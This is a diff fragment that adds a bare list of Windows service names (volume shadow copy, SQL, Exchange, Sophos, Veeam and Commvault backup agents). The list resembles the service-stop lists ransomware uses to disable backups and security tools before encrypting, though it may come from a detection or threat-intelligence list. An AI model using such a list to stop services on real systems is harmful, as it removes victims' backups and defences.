@@ -1,0 +1,14 @@
+vss
+sql
+svc$
+memtas
+mepocs
+msexchange
+sophos
+veeam
+backup
+GxVss
+GxBlr
+GxFWD
+GxCVD
+GxCIMgr
